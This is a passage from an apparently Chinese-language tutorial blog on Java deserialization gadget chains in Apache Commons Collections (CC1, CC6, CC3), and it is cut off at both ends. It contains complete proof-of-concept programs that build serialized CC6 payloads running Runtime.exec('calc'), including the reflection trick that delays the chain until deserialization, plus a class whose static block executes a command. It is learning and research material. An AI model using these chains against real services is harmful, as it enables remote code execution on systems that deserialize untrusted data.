class="operator">=</span>  annotationconstructor.newInstance(Target.class, transformedmap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321215644440.png" alt="image-20240321215644440"></p><p>成功执行!</p><h1 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h1><h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>由于在java8u71大版本中AnnotationInvocationHandler.readObject被修改了，没有上述CC1的调用链,因此出现了CC6, 事实上CC6是CC1的变种, 它没有版本限制, 这里我们依旧沿用CC1的环境</p><h2 id="链子分析-1"><a href="#链子分析-1" class="headerlink" title="链子分析"></a>链子分析</h2><p>在此之前, 让我们先来回忆一下CC1的调用链</p><ol><li><p>首先 入口为AnnotationInvocationHandler的readObject, readObject下有一个setValue方法,此时setValue参数不可控</p></li><li><p>通过同名方法, 跳转到TransformedMap下的setValue方法(此方法继承自AbstractInputCheckedMapDecorator), 又调用TransformedMap下的CheckValue方法, CheckValue中调用了可控参数的transform方法</p></li><li><p>通过transform同名方法, 跳转到ChainedTransformer下的transform, 此方法递归调用了一个可控数组的transform方法,形成一个调用链, 通过将可控数组第一个元素赋值为ConstantTransformer, 调用ConstantTransformer的transform返回一个Runtime,Class作为下一次transform调用的参数, 绕过步骤1中etValue参数不可控的问题, 逐步通过InvokerTransformer调用链执行我们想要的行为</p></li></ol><p>这是我们上面分析出的CC1</p><p>再来看下ysoserial上的CC1链子</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240329211807221.png" alt="image-20240329211807221"></p><p>不同之处是ysoserial用的是LazyMap.get, 而我们使用的是TransformedMap.setValue()</p><p>再来看ysoserial上的CC6链子</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330121419699.png" alt="image-20240330121419699"></p><p>这里后半段链子实际上和ysoserial中的CC1的后半段高度相似, 不同的是CC1中调用LazyMap.get()的是AnnotationInvocationHandler, 而这里是TiedMapEntry</p><p>先来看LazyMap, 这里之前没有分析过</p><p>与TransformedMap类似, 它也有一个decorate方法来返回一个LazyMap对象, 并且使得get方法中的参数可控</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330201851832.png" alt="image-20240330201851832"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330201820196.png" alt="image-20240330201820196"></p><p>转到TiedMapEntry, 可以发现它调用了可控对象的get方法, 并且传给get的参数可控</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330190853630.png" alt="image-20240330190853630"></p><p>再看谁调用了getValue()             <em><strong>后续不需要考虑参数, 因为这里的getValue并没有接收任何参数</strong></em></p><p>往下翻就能看见就能发现, hashCode()调用了getValue</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330191238122.png" alt="image-20240330191238122"></p><p>看见hashCode,就可以想到去HashMap集合中寻找其调用</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330192257619.png" alt="image-20240330192257619"></p><p>继续寻找谁调用了hash, 答案是put (这里选用put是ysoserial中的链子, 后面会更改)</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330195711124.png" alt="image-20240330195711124"></p><p>之后是HashSet中的readObject调用了put</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330200217088.png" alt="image-20240330200217088"></p><p>以上是ysoserial中的调用链, 实际上我们并不需要去调用HashSet中的readObject, 在URLDNS链子中, 我们调用了hashMap中的readObject, 在readObject的最后调用了hash</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330224651396.png" alt="image-20240330224651396"></p><p>跟进, 调用hashCode</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330224957275.png" alt="image-20240330224957275"></p><p>之后就是构造调用到TiedMapEntry</p><p>需要注意的是, </p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330232456683.png" alt="image-20240330232456683"></p><p>想要进入这个if, 需要使map中没有key, 这个key是TiedMapEntry的第二个参数传过来的, 我们传入了一个aaa, 因此我们必须在put后将它remove掉</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure><p>poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">       <span class="comment">// serialize(hashMap);</span></span><br><span class="line">        <span class="comment">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可是这里即使不进行序列化反序列化依旧会弹出计算器</p><p>问题就出在了hashmap.put</p><p>在我们还没进行序列化操作的时候进行了put操作,它调用hash方法, 并且传入的参数也是我们的利用代码, 自然会弹出计算器, </p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330231133198.png" alt="image-20240330231133198"></p><p>因此, 我们应该避免以上情况, 我们可以先put一个无用的值进去, put结束后再通过反射将其改为我们的利用代码</p><p>转到LazyMap, 这里的factory, 也就是我们传入chainedTransformer的参数, 我们可以反射更改这个常量</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330231902285.png" alt="image-20240330231902285"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazymap,chainedTransformer);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功执行, 结束</p><h1 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h1><p>CC3就和CC1、CC6不同了，后者是执行命令，而前者是通过动态加载类，然后实例化类达到执行静态代码块的目的</p><p>因此我们先来复习一下类的动态加载和双亲委派机制</p><h2 id="类的动态加载"><a href="#类的动态加载" class="headerlink" title="类的动态加载"></a>类的动态加载</h2><p>在此之前需要介绍2个代码块，<strong>静态代码块和构造代码块</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    system.out.printIn(<span class="string">&quot;构造代码块&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line"> system.out.printIn(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在类进行__初始化__的时候, __静态代码块__会被执行</p><p>在类进行__实例化__的时候，__构造代码块和构造函数和静态代码块__一并执行</p><p>例:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String word)</span> &#123;</span><br><span class="line">        System.out.println(word);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加载类并默认进行初始化:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">          <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.example.Person&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240510222635510.png" alt="image-20240510222635510"></p><p>加载类但不初始化:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        ClassLoader c1=ClassLoader.getSystemClassLoader();</span><br><span class="line">        Class.forName(<span class="string">&quot;org.example.Person&quot;</span>,<span class="literal">false</span>,c1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240510223610815.png" alt="image-20240510223610815"></p><p>实例化:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">          <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240510222941281.png" alt="image-20240510222941281"></p><h2 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h2><blockquote><p>所谓的双亲委派机制，指的就是：<strong>当一个类加载器收到了类加载的请求的时候，他不会直接去加载指定的类，而是把这个请求委托给自己的父加载器去加载。只有父加载器无法加载这个类的时候，才会由当前这个加载器来负责类的加载。</strong><br>那么，什么情况下父加载器会无法加载某一个类呢？<br>其实，Java中提供的这四种类型的加载器，是有各自的职责的：</p><ul><li>Bootstrap ClassLoader ，主要负责加载Java核心类库，%JRE_HOME%\lib下的rt.jar、resources.jar、charsets.jar和class等。</li><li>Extention ClassLoader，主要负责加载目录%JRE_HOME%\lib\ext目录下的jar包和class文件。</li><li>Application ClassLoader ，主要负责加载当前应用的classpath下的所有类</li><li>User ClassLoader ， 用户自定义的类加载器,可加载指定路径的class文件</li></ul></blockquote><h2 id="URLclassLoader任意类加载"><a href="#URLclassLoader任意类加载" class="headerlink" title="URLclassLoader任意类加载"></a>URLclassLoader任意类加载</h2><p>这个类里面还有一个loadclass方法，可以通过URL加载类</p><h2 id="ClassLoader加载字节码执行命令"><a href="#ClassLoader加载字节码执行命令" class="headerlink" title="ClassLoader加载字节码执行命令"></a>ClassLoader加载字节码执行命令</h2><p>通过跟进调试双亲委派机制, 我们发现最终是<code>Classloader.defineClass</code>加载字节码来加载类, 那么, 就可以反射获取<code>defineClass</code>来直接加载任意类</p><p>生成目标类字节码文件:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反射加载类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 